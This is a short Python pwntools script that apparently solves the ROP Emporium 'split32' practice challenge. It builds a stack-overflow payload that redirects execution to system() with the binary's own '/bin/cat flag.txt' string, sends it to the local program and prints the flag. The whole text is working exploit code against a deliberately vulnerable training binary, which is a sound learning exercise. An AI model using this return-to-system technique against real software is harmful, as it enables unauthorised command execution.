from pwn import *



elf = ELF("split32")

cat_flag_adr = next(elf.search(b"/bin/cat flag.txt"))
system_plt_adr = elf.plt["system"]

log.info("string: " + hex(cat_flag_adr) + f" {cat_flag_adr}")


payload = b""
payload += b"A"*(54-8-2)
payload += pack(system_plt_adr, 32)
payload += b"B"*4   # ret
payload += pack(cat_flag_adr, 32)

write("/tmp/docgil", payload)

p = process(["split32"])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")